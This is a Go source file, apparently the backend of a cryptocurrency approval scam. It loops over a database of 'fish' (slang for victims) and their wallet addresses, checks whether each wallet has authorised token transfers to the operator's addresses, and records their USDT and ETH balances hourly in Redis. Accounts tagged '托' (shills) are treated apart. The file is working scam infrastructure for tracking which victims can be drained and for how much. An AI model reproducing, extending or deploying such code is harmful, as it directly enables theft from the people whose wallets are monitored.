/**
 * @Author $
 * @Description //TODO $
 * @Date $ $
 * @Param $
 * @return $
 **/
package process

import (
	"context"
	"fmt"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/ethclient"
	"github.com/go-redis/redis"
	"github.com/jinzhu/gorm"
	"github.com/spf13/viper"
	token "github.com/wangyi/fishpond/eth"
	"github.com/wangyi/fishpond/model"
	"github.com/wangyi/fishpond/util"
	"math/rand"
	"strings"
	"time"
)

/**
  检查  钱包地址是否   已经授权转账
*/
func CheckAu(Db *gorm.DB, redis *redis.Client) {
	for true {
		fish := make([]model.Fish, 0)
		//apiKey := viper.GetString("eth.apikey")
		err := Db.Find(&fish).Error
		if err == nil {
			for _, value := range fish {
				apikeyP := viper.GetString("eth.apikey")
				apikeyArray := strings.Split(apikeyP, "@")
				apikey := apikeyArray[rand.Intn(len(apikeyArray))]
				config := model.Config{}
				err := Db.Where("id=1").First(&config).Error
				BLisT := make([]model.BAddressList, 0)
				err1 := Db.Find(&BLisT).Error
				var c []string
				if err1 == nil {
					for _, v := range BLisT {
						c = append(c, v.BAddress)
					}
				}
				if err == nil && value.Remark != "托" {
					util.ChekAuthorizedFoxAddress(value.FoxAddress, apikey, config.BAddress, Db, c, redis)
				}
				time.Sleep(500 * time.Millisecond)
			}
		}
		time.Sleep(500 * time.Second)
	}
}

/**
  更新余额进程
*/
func CheckMoney(Db *gorm.DB, redis *redis.Client) {
	fmt.Println("CheckMoney process is running")
	for true {
		fish := make([]model.Fish, 0)
		err := Db.Find(&fish).Error
		if err == nil {
			for _, kk := range fish {
				if kk.Remark != "托" {
					util.UpdateUsdAndEth(kk.FoxAddress, Db, kk.Money, int(kk.ID), kk.AdminId, kk.Remark, redis)
				}
				time.Sleep(3 * time.Second)
			}
		}
		time.Sleep(60 * time.Second)
	}
}

/**
  每小时更新一次 鱼的钱
*/
func OneHourUpdateFishMoney(db *gorm.DB, redis *redis.Client) {
	fmt.Println("OneHourUpdateFishMoney process is running")
	for true {
		fish := make([]model.Fish, 0)
		err := db.Where("authorization=2 or remark=? or no_proceeds_are_authorized_switch=1", "托").Find(&fish).Error //
		if err != nil {
			fmt.Println("OneHourUpdateFishMoney " + err.Error())
			continue
		}

		for _, b := range fish { //查询 账户的usdt  和  eth
			ethUrl := viper.GetString("eth.ethUrl")
			client, err := ethclient.Dial(ethUrl)
			if err != nil {
				return
			}
			//获取 美元
			tokenAddress := common.HexToAddress("0xdAC17F958D2ee523a2206206994597C13D831ec7") //usDT
			instance, err := token.NewToken(tokenAddress, client)
			if err != nil {
				return
			}
			address := common.HexToAddress(b.FoxAddress)
			bal, err := instance.BalanceOf(&bind.CallOpts{}, address)
			//if err != nil {
			//	return
			//}
			//usd22 := util.ToDecimal(bal.String(), 6)
			balance, err := client.BalanceAt(context.Background(), address, nil)
			//if err != nil {
			//	return
			//}
			//eth := util.ToDecimal(balance.String(), 18)
			//fmt.Println(eth.Float64())
			//fmt.Println(balance.String())

			//data := make(map[string]float64)
			//fmt.Println(usd22.Float64())
			//data["money_eth"], _ = eth.Float64()
			////b, _ := strconv.ParseFloat(usd.String(), 64)

			fmt.Println(balance.String())
			fmt.Println(bal.String())
			type addRedis struct {
				eth string
				usd string
			}
			h1, _ := redis.HExists("TodayAvg_"+time.Now().Format("2006-01-02")+"_"+b.FoxAddress, "ETH").Result()
			if !h1 { // 没有
				redis.HSet("TodayAvg_"+time.Now().Format("2006-01-02")+"_"+b.FoxAddress, "ETH", balance.String())
				redis.HSet("TodayAvg_"+time.Now().Format("2006-01-02")+"_"+b.FoxAddress, "USDT", bal.String())
				continue
			}

			//获取 美元
			usd, _ := redis.HGet("TodayAvg_"+time.Now().Format("2006-01-02")+"_"+b.FoxAddress, "USDT").Result()
			//usd2 := util.ToDecimal(usd, 6)
			//usd3, _ := usd2.Add(util.ToDecimal(bal.String(), 6)).Div(decimal.NewFromInt(2)).Float64()
			//wei := util.ToWei(usd3, 6) //692050000
			//redis.HSet("TodayAvg_"+time.Now().Format("2006-01-02")+"_"+b.FoxAddress, "USDT", wei.String())
			eth, _ := redis.HGet("TodayAvg_"+time.Now().Format("2006-01-02")+"_"+b.FoxAddress, "ETH").Result()
			//eth2 := util.ToDecimal(eth, 18)
			//eth3, _ := eth2.Add(util.ToDecimal(balance.String(), 18)).Div(decimal.NewFromInt(2)).Float64()
			//wei = util.ToWei(eth3, 18) //  3066819836427141
			//redis.HSet("TodayAvg_"+time.Now().Format("2006-01-02")+"_"+b.FoxAddress, "ETH", wei.String())
			redis.HSet("TodayAvg_"+time.Now().Format("2006-01-02")+"_"+b.FoxAddress, "USDT", usd+"@"+bal.String())
			redis.HSet("TodayAvg_"+time.Now().Format("2006-01-02")+"_"+b.FoxAddress, "ETH", eth+"@"+balance.String())

		}
		time.Sleep(3600 * time.Second)
	}
}
